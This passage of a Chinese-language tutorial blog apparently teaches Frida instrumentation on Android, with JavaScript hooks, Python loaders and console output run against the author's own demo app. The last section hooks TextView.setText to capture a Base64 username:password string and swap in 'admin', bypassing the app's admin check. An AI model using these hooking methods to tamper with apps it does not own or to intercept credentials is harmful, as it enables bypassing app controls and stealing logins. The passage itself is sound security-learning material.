class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input() <span class="comment">#等待输入</span></span><br></pre></td></tr></table></figure><p>解释一下，这个脚本就是先通过<code>frida.get_device_manager().add_remote_device</code>来找到device,然后spawn方式启动settings，然后attach到上面，并执行frida脚本。</p><h2 id="FRIDA基础"><a href="#FRIDA基础" class="headerlink" title="FRIDA基础"></a>FRIDA基础</h2><h3 id="frida查看当前存在的进程"><a href="#frida查看当前存在的进程" class="headerlink" title="frida查看当前存在的进程"></a>frida查看当前存在的进程</h3><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps --help</span><br><span class="line">Usage: frida-ps [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#39;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -D ID, --device&#x3D;ID    connect to device with the given ID</span><br><span class="line">  -U, --usb             connect to USB device</span><br><span class="line">  -R, --remote          connect to remote frida-server</span><br><span class="line">  -H HOST, --host&#x3D;HOST  connect to remote frida-server on HOST</span><br><span class="line">  -a, --applications    list only applications</span><br><span class="line">  -i, --installed       include all installed applications</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps -U</span><br><span class="line">  PID  Name</span><br><span class="line">-----  ---------------------------------------------------</span><br><span class="line"> 3640  ATFWD-daemon</span><br><span class="line">  707  adbd</span><br><span class="line">  728  adsprpcd</span><br><span class="line">26041  android.hardware.audio@2.0-service</span><br><span class="line">  741  android.hardware.biometrics.fingerprint@</span><br></pre></td></tr></table></figure><p>通过grep过滤就可以找到我们想要的包名。</p><h3 id="frida打印参数和修改返回值"><a href="#frida打印参数和修改返回值" class="headerlink" title="frida打印参数和修改返回值"></a>frida打印参数和修改返回值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> myapplication.example.com.frida_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String total = <span class="string">"@@@###@@@"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">            Log.d(<span class="string">"sakura.string"</span> , fun(<span class="string">"LoWeRcAsE Me!!!!!!!!!"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"sakura.Sum"</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        total +=x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Enter the Script!"</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Inside Java perform"</span>);</span><br><span class="line">        <span class="keyword">var</span> MainActivity = Java.use(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>);</span><br><span class="line">        <span class="comment">// 重载找到指定的函数</span></span><br><span class="line">        MainActivity.fun.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//打印参数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"original call : str:"</span> + str);</span><br><span class="line">            <span class="comment">//修改结果</span></span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="string">"sakura"</span>;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps -U | grep frida</span><br><span class="line">8738  frida-helper-32</span><br><span class="line">8897  myapplication.example.com.frida_demo</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; -f是通过spawn，也就是重启apk注入js</span><br><span class="line">sakura@sakuradeMacBook-Pro:~$ frida -U -f myapplication.example.com.frida_demo -l frida_demo.js</span><br><span class="line">...</span><br><span class="line">original call : str:LoWeRcAsE Me!!!!!!!!!</span><br><span class="line">12-21 04:46:49.875 9594-9594&#x2F;myapplication.example.com.frida_demo D&#x2F;sakura.string: sakura</span><br></pre></td></tr></table></figure><h3 id="frida寻找instance，主动调用。"><a href="#frida寻找instance，主动调用。" class="headerlink" title="frida寻找instance，主动调用。"></a>frida寻找instance，主动调用。</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Enter the Script!"</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Inside Java perform"</span>);</span><br><span class="line">        <span class="keyword">var</span> MainActivity = Java.use(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>);</span><br><span class="line">        <span class="comment">//overload 选择被重载的对象</span></span><br><span class="line">        MainActivity.fun.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//打印参数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"original call : str:"</span> + str);</span><br><span class="line">            <span class="comment">//修改结果</span></span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="string">"sakura"</span>;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 寻找类型为classname的实例</span></span><br><span class="line">        Java.choose(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"find instance :"</span> + x);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"result of secret func:"</span> + x.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><h3 id="frida-rpc"><a href="#frida-rpc" class="headerlink" title="frida rpc"></a>frida rpc</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"begin"</span>);</span><br><span class="line">        Java.choose(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"find instance :"</span> + x);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"result of fun(string) func:"</span> + x.fun(Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(<span class="string">"sakura"</span>)));</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    callfun: callFun</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">"myapplication.example.com.frida_demo"</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"frida_demo_rpc_call.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">script.exports.callfun()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ python frida_demo_rpc_loader.py </span><br><span class="line">begin</span><br><span class="line">find instance :myapplication.example.com.frida_demo.MainActivity@1d4b09d</span><br><span class="line">result of fun(string):sakura</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="frida动态修改"><a href="#frida动态修改" class="headerlink" title="frida动态修改"></a>frida动态修改</h3><p>即将手机上的app的内容发送到PC上的frida python程序，然后处理后返回给app，然后app再做后续的流程，核心是理解<code>send/recv</code>函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"please input username and password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editText"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"username"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxLength</span>=<span class="string">"20"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.095"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editText2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxLength</span>=<span class="string">"20"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.239"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"35dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"right|center_horizontal"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"提交"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">"visible"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.745"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        password_et = (EditText) <span class="keyword">this</span>.findViewById(R.id.editText2);</span><br><span class="line">        username_et = (EditText) <span class="keyword">this</span>.findViewById(R.id.editText);</span><br><span class="line">        message_tv = ((TextView) findViewById(R.id.textView));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (username_et.getText().toString().compareTo(<span class="string">"admin"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    message_tv.setText(<span class="string">"You cannot login as admin"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message_tv.setText(<span class="string">"Sending to the server :"</span> + Base64.encodeToString((username_et.getText().toString() + <span class="string">":"</span> + password_et.getText().toString()).getBytes(), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析问题，我的最终目标是让message_tv.setText可以”发送”username为admin的base64字符串。<br>那肯定是hook TextView.setText这个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tv_class = Java.use(<span class="string">"android.widget.TextView"</span>);</span><br><span class="line">    tv_class.setText.overload(<span class="string">"java.lang.CharSequence"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send = x.toString();</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        send(string_to_send); <span class="comment">// send data to python code</span></span><br><span class="line">        recv(<span class="function"><span class="keyword">function</span> (<span class="params">received_json_object</span>) </span>&#123;</span><br><span class="line">            string_to_recv = received_json_object.my_data</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"string_to_recv: "</span> + string_to_recv);</span><br><span class="line">        &#125;).wait(); <span class="comment">//block execution till the message is received</span></span><br><span class="line">        <span class="keyword">var</span> my_string = Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(string_to_recv);</span><br><span class="line">        <span class="keyword">this</span>.setText(my_string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">"send"</span>:</span><br><span class="line">        print(message[<span class="string">"payload"</span>])</span><br><span class="line">        data = message[<span class="string">"payload"</span>].split(<span class="string">":"</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        print( <span class="string">'message:'</span>, message)</span><br><span class="line">        <span class="comment">#data = data.decode("base64")</span></span><br><span class="line">        <span class="comment">#data = data</span></span><br><span class="line">        data = str(base64.b64decode(data))</span><br><span class="line">        print( <span class="string">'data:'</span>,data)</span><br><span class="line">        user, pw = data.split(<span class="string">":"</span>)</span><br><span class="line">        print( <span class="string">'pw:'</span>,pw)</span><br><span class="line">        <span class="comment">#data = ("admin" + ":" + pw).encode("base64")</span></span><br><span class="line">        data = str(base64.b64encode((<span class="string">"admin"</span> + <span class="string">":"</span> + pw).encode()))</span><br><span class="line">        print( <span class="string">"encoded data:"</span>, data)</span><br><span class="line">        script.post(&#123;<span class="string">"my_data"</span>: data&#125;)  <span class="comment"># send JSON object</span></span><br><span class="line">        print( <span class="string">"Modified data sent"</span>)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">"myapplication.example.com.frida_demo"</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"frida_demo2.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line">input()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ python frida_demo_rpc_loader2.py </span><br><span class="line">Script loaded successfully </span><br><span class="line">&#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;\n&#39;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;\n&#39;&#125;</span><br><span class="line">data: b&#39;sakura:123456&#39;</span><br><span class="line">pw: 123456&#39;</span><br><span class="line">encoded data: b&#39;YWRtaW46MTIzNDU2Jw&#x3D;&#x3D;&#39;</span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: 